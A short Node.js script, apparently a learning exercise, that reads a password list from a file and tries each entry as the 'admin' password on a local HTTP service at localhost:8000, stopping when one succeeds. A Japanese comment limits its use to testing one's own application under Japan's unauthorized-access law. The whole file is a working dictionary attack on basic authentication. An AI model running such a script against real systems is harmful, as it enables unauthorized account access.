'use strict';
const axios = require('axios');
const fs = require('fs');
const readline = require('readline');
const rs = fs.ReadStream('password');
const rl = readline.createInterface({ input: rs, output: {} });
rl.on('line', line => {
  // 不正アクセス禁止法に抵触しないよう自分の開発アプリケーションの検証用途に用いること
  axios
    .get(`http://admin:${line}@localhost:8000/posts`)
    .then(response => {
      if (response.status === 200) {
        console.log(`Password is "${line}"`);
        process.exit();
      }
    })
    .catch(error => {});
});
rl.on('close', () => {
  console.log('password file was closed.');
});